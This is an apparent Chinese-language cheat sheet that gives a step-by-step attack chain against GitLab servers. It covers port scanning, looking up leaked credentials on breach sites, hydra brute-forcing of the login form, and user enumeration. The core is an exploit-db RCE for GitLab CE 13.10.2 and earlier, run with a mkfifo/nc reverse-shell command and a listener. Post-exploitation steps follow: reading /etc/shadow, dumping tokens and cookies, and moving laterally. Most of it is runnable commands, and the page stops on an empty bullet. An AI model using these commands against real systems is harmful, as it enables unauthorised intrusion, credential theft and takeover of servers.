---
description: >-
  GitLab是一個基於 Web 的 Git 儲存庫託管工具，提供 wiki 功能、問題追蹤以及持續整合和部署管道功能。它是開源的，最初是用 Ruby
  編寫，但目前的技術堆疊包括 Go、Ruby on Rails 和 Vue.js。 Gitlab 於 2014 年首次推出，多年來，已發展成為一家擁有
  1,400 名員工的公司，2020 年的收入為 1.5 億美元。以下是有關 GitLab 的一些快速
---

# Gitlab

## <mark style="color:red;">**1. 發現點**</mark>

* 用 `nmap` 掃描內網 / 外網：

```bash
nmap -sV -p- --open -T4 10.10.10.10
```

* 發現有 `GitLab` UI（一般 port：80/443/8081）
* 打開 `http://gitlab.xxx.local`
* 留意登入頁面有「GitLab」標誌

## <mark style="color:red;">**2. 測試Payload**</mark>

* 去網站:
  * [https://dehashed.com](https://dehashed.com)
  * [https://breach-parse.sh](https://breach-parse.sh)
* 搜尋公司域名，下載可能洩露 email + 密碼
* 嘗試弱密碼登入

```bash
hydra -L emails.txt -P passwords.txt gitlab.xxx.local http-form-post "/users/sign_in"
```

## <mark style="color:red;">3. 使用者枚舉</mark>

* 安裝 `GitLabUserEnum` 工具\
  GitHub: [https://github.com/dpgg101/GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum)

```bash
python3 GitLabUserEnum.py -u http://gitlab.xxx.local
```

* 列出有效帳戶名稱

***

## <mark style="color:red;">4. 搜尋敏感資訊</mark>

* 登入成功後
* 查看公共 Repository，有時會有：
  * `.env` 檔案
  * SSH Key
  * API keys
  * 資料庫密碼
* 用 `grep` 搜索敏感字眼：

```bash
grep -r -i "password" ./repo-folder/
```

## <mark style="color:red;">5. 利用 GitLab RCE（ExifTool 漏洞）</mark>

> 適用版本：GitLab CE <= 13.10.2

* 用以下 python exploit：
* [https://www.exploit-db.com/exploits/49951](https://www.exploit-db.com/exploits/49951)

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.xxx.local:8081 -u <帳號> -p <密碼> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <你的IP> <你的PORT> >/tmp/f'
```

* 開啟 nc listener：

```bash
nc -lnvp 8443
```

* 成功會收到 www-data shell！

## <mark style="color:red;">6. 拿到 shell 後的動作</mark>

* 提升權限：

```bash
sudo -l
```

* 檢查能不能執行其他指令
* 如果可以 Win / Linux 提權
* 找 `root.txt` 或 `/etc/shadow`

***

* Dump token / cookie
* 橫向到其他服務（SMTP、FTP、VPN）
* 拿下 AD 資訊
*
